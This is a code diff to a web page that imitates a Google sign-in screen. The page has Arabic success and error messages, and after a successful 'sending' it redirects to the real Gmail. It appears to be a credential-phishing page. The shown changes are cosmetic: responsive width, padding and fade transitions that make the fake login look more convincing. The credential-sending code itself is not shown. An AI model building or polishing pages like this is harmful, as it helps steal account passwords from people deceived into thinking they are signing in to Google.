@@ -17,6 +17,7 @@
             align-items: center;
             min-height: 100vh;
             background-color: #f9f9f9;
+            padding: 20px;
         }
 
         .login-container {
@@ -25,7 +26,8 @@
             border: 1px solid #dadce0;
             border-radius: 12px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            width: 400px;
+            width: 100%;
+            max-width: 400px;
         }
 
         .google-logo {
@@ -55,6 +57,7 @@
             border-radius: 6px;
             font-size: 16px;
             margin-top: 8px;
+            transition: border-color 0.3s ease-in-out;
         }
 
         input:focus {
@@ -110,7 +113,7 @@
             font-size: 14px;
             font-weight: 500;
             cursor: pointer;
-            transition: background 0.3s;
+            transition: background 0.3s ease-in-out;
         }
 
         .next-button:hover {
@@ -123,6 +126,7 @@
             border-radius: 6px;
             display: none;
             font-size: 14px;
+            transition: opacity 0.3s ease-in-out;
         }
 
         .alert-error {
@@ -189,7 +193,8 @@
                         alertDiv.className = "alert alert-success";
                         alertDiv.style.display = "block";
                         alertDiv.textContent = "تم تسجيل الدخول بنجاح!";
-                        
+                        alertDiv.style.opacity = 1;
+
                         // إعادة التوجيه بعد نجاح الإرسال
                         setTimeout(() => {
                             window.location.href = "https://mail.google.com";
@@ -199,6 +204,7 @@
                         alertDiv.className = "alert alert-error";
                         alertDiv.style.display = "block";
                         alertDiv.textContent = "حدث خطأ أثناء تسجيل الدخول. يرجى المحاولة مرة أخرى.";
+                        alertDiv.style.opacity = 1;
                     }
                 );
             });
